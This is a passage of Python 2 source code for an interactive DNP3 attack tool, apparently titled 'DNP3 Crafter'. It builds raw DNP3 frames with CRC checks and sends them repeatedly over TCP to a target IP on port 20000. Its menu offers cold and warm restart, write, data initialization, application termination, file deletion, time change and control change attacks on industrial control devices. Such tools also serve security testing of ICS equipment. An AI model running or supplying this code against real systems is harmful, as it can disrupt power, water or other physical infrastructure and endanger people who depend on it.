	elif function == 1 and group == 86:
		print " Enter 6 "
	elif function == 1 and group == 87:
		print " Enter 0 , 1, or 6 "
	elif function == 1 and group == 110:
		print " Enter 0 , 1, or 6 "
	if function == 2 and group == 0:
		print " Enter 0 "
	elif function == 2 and group == 10:
		print " ??? "
	elif function == 2 and group == 34:
		print " Enter 0 or 1 "
	elif function == 2 and group == 50:
		print " Enter 7 "
	elif function == 2 and group == 70:
		print "Enter 91"
	elif function == 2 and group == 80:
		print " ??? "
	elif function == 2 and group == 85:
		print " ??? "
	elif function == 2 and group == 86:
		print " ??? "
	elif function == 2 and group == 87:
		print " Enter 0 or 1 "
	if function == 3 and group == 12:
		print " Enter 17 or 28"
	elif function == 3 and group == 41:
		print " Enter 17 or 28"
	elif function == 3 and group == 87:
		print " ??? "
	if function == 4 and group == 12:
		print " Enter 17 or 28"
	elif function == 4 and group == 41:
		print " Enter 17 or 28"
	if function == 5 and group == 12:
		print " Enter 17 or 28"
	elif function == 5 and group == 41:
		print " Enter 17 or 28"
	elif function == 5 and group == 87:
		print " ??? "
	if function == 6 and group == 12:
		print " Enter 17 or 28"
	elif function == 6 and group == 41:
		print " ??? "
	elif function == 6 and group == 87:
		print " ??? "
	if function == 7 and group == 20:
		print " ??? "
	elif function == 7 and group == 30:
		print " ??? "
	if function == 8 and group == 20:
		print " ??? "
	elif function == 8 and group == 30:
		print " ??? "
	if function == 9 and group == 20:
		print " ??? "
	if function == 10 and group == 20:
		print " ??? "
	if function == 11 and group == 20:
		print " ??? "
	elif function == 11 and group == 30:
		print " ??? "
	elif function == 11 and group == 50:
		print " ??? "
	if function == 12 and group == 20:
		print " ??? "
	elif function == 12 and group == 50:
		print " ??? "
	if function == 20 and group == 60:
		print "Enter 6 "
	if function == 21 and group == 60:
		print "Enter 6 "
	if function == 22 and group == 1:
		print " ??? "
	elif function ==22 and group == 3:
		print " ??? "
	elif function == 22 and group == 10:
		print " ??? "
	elif function == 22 and group == 12:
		print " ??? "
	elif function == 22 and group == 20:
		print " ??? "
	elif function == 22 and group == 21:
		print " ??? "
	elif function == 22 and group == 30:
		print " ??? "
	elif function == 22 and group == 31:
		print " ??? "
	elif function == 22 and group == 40:
		print " ??? "
	elif function == 22 and group == 41:
		print " ??? "
	elif function == 22 and group == 60:
		print " ??? "
	elif function == 22 and group == 86:
		print " ??? "
	if function == 25  and group == 70:
		print "Enter 91"
	if function == 26  and group == 70:
		print "Enter 91"
	if function == 27  and group == 70:
		print "Enter 91"
	if function == 28 and group == 70:
		print "Enter 91"
	if function == 29 and group == 70:
		print "Enter 91"
	if function == 30 and group == 70:
		print "Enter 91"
	if function == 31 and group == 70:
		print "Enter 91"
    	
def qulifier_code(function,group):
	print_qulifier_code(function,group)
   	print "Enter the Range Quantity ( use 7 for read function)"
	Range_code = int(raw_input())
	Range_code =binascii.unhexlify(str(format(Range_code, '#04x').replace("0x","")))
	return Range_code

def num_item():
	print "Enter the number of item"
	Num = int(raw_input())
	Num =binascii.unhexlify(str(format(Num, '#04x').replace("0x","")))
	#Num = Num[1:]+Num[0:1]
	return Num

def Detail():
	try:
		print "Enter payload qualifer->range Field"
		payload = binascii.unhexlify(str(raw_input()))
		return payload
	except TypeError:
		return Detail()
#########################################################################################

''' Source and Dest of the packet ''' 
def Source_Dest():
	Source = -1
	while Source > 65535 or Source < 0:
		print "Enter Source (0-65535)"
		Source = int(raw_input())

	Dest = -1
	while Dest > 65535 or Dest < 0:
		print "Enter Destination must be different than the source (0-65535)"
		Dest = int(raw_input())

	Dest = binascii.unhexlify(str(format(Dest, '#06x').replace("0x","")))
	"reverse the order"
	Dest = Dest[1:]+Dest[0:1]
	Source = binascii.unhexlify(str(format(Source, '#06x').replace("0x","")))
	"reverse the order"
	Source = Source[1:]+Source[0:1]
	return  Dest + Source
''''''

''' the heart of the program ''' 
def custum_payload():
    #control of dnp3 function need works here
	'''
	try:
		control = dnp3_control()
	except TypeError:
		control = dnp3_control()
	'''
	tmp = T_seq()
	data ,function_check, = dnp3_function()

	print "what user choose : " ,function_check
	if (function_check > 11 and function_check < 18) or function_check == 1:
		data = T_seq()  + A_seq() + data
	else:
		group_check = set_group(function_check-1)
		data += group_check
		data = T_seq()  + A_seq() + data + Variation(function_check-1,group_check) + qulifier_code(function_check-1,group_check) + num_item()
	total_cnt = len(data) + 5
	header = "\x05\x64"+ chr(total_cnt)+"\xc4"+Source_Dest()
	packet = """%s%s%s%s""" % (header, struct.pack('>H', CRC16DNP().calculate(header)), data, struct.pack('>H', CRC16DNP().calculate(data)))
	return packet

''''''

''' for fun '''
def custum_control():
	print "Enter control mode (192-196 and 201)"
	control = Num = int(raw_input())
	control =binascii.unhexlify(str(format(Num, '#04x').replace("0x","")))
	header = "\x05\x64"+ chr(5)+control+Source_Dest()
	packet = """%s%s""" % (header, struct.pack('>H', CRC16DNP().calculate(header)))
	return packet

''''''

''' What attack type are available '''
def attack_type():
	print "Enter a type of attack:"
	attack_type = int(raw_input())

	if attack_type == 1:
		dnp3 = custum_payload()

	if attack_type == 2:
		dnp3=dnp3_warm_start()

	if attack_type == 3:
		dnp3=dnp3_cold_start()

	if attack_type == 4:
		dnp3= dnp3_write()

	if attack_type == 5:
		dnp3= dnp3_data_attack()

	if attack_type == 6:
		dnp3= dnp3_app_attack()

	if attack_type == 7:
		dnp3= dnp3_file_delete()

	if attack_type == 8:
		 dnp3="\x05\x64\x05\xc0\x01\x00\x00\x04\xe9\x21"

	if attack_type == 9:
		dnp3 = dnp3_time_change()

	if attack_type == 10:
		dnp3 = dnp3_request_write_time_date()

	if attack_type == 11:
		dnp3 = custum_control()

	return dnp3

def print_attack_type():
	''' Options selector '''

	print 'Choose one action to perform:'
	print '1: Custom packet'
	print '2: Warm Restart attack'
	print '3: Cold Restart attack'
	print '4: Write attack'
	print '5: Initialize data attack'
	print '6: App function termination attack'
	print '7: Delete file attack'
	print '8: Health check'
	print '9: Time Attack'
	print '10: Write_time_date'
	print '11: Control Change'
	print ' '

''''''

if __name__ == "__main__":

	print "    ___     __   ___  _____    ___              __  _              "
	print "   /   \ /\ \ \ / _ \|___ /   / __\_ __  __ _  / _|| |_  ___  _ __ "
	print "  / /\ //  \/ // /_)/  |_ \  / /  | '__|/ _` || |_ | __|/ _ \| '__|"
	print " / /_/// /\  // ___/  ___) |/ /___| |  | (_| ||  _|| |_|  __/| |   "
	print "/___,' \_\ \/ \/     |____/ \____/|_|   \__,_||_|   \__|\___||_|\n "

	if len(sys.argv) != 2:
		print '\nMissing arguments!'
		print 'Try ./emisor.py dst-ip'
		print 'Exiting...'
		quit()

	ipdst = sys.argv[1]
	destport= 20000   #DNP3 standard port

	''' Open default python socket '''

	mysocket = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
	mysocket.connect((ipdst,destport))

	print_attack_type()

	dnp3_packet = attack_type()

	print 'Choose number of repetitions:'

	attack_count = int(raw_input())
	''' Perform selected attack '''

	i = 0
	packet=dnp3_packet
	print ''

	while (i < attack_count):
		send_dnp3_packet(mysocket,packet)
		i=i+1
		time.sleep(0.02) #Time lapse between packets (in seconds)
		print 'Sent' , i , 'repetitions...'

	print 'Finished.\n'
	mysocket.close()

